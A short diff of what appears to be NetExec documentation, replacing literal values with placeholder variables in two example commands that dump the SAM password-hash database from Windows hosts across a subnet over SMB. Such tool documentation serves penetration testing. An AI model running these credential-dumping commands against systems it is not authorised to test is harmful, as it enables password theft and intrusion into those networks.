@@ -7,11 +7,11 @@ You need at least local admin privilege on the remote target, use option **--loc
 {% endhint %}
 
 ```bash
-nxc smb 192.168.1.0/24 -u UserName -p 'PASSWORDHERE' --sam
+nxc smb $TARGET/24 -u $USER -p $PASSWORD --sam
 ```
 
 If this command fail you can also try the old method (similar to secretdump)
 
 ```bash
-nxc smb 192.168.1.0/24 -u UserName -p 'PASSWORDHERE' --sam secdump
+nxc smb $TARGET/24 -u $USER -p $PASSWORD --sam secdump
 ```
